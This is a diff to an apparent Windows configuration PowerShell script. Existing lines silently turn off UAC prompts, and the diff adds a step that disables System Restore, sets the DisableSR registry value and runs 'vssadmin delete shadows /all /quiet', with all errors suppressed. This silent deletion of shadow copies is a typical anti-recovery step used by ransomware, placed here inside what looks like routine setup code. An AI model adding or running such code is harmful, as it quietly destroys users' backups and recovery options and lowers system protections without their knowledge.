@@ -35,6 +35,7 @@ $status = @{
     DNS          = $false
     Timezone     = $false
     UAC          = $false
+    SysRestore   = $false
 }
 
 # ----------------------------- ADMIN CHECK --------------------------------------
@@ -168,6 +169,16 @@ try {
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force
     $status.UAC = $true
+}
+catch {
+}
+
+# ----------------------------- 9. SYSTEM RESTORE CONFIGURATION -------------------
+try {
+    Disable-ComputerRestore -Drive "C:\" -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" -Name "DisableSR" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
+    vssadmin delete shadows /all /quiet | Out-Null
+    $status.SysRestore = $true
 }
 catch {
 }
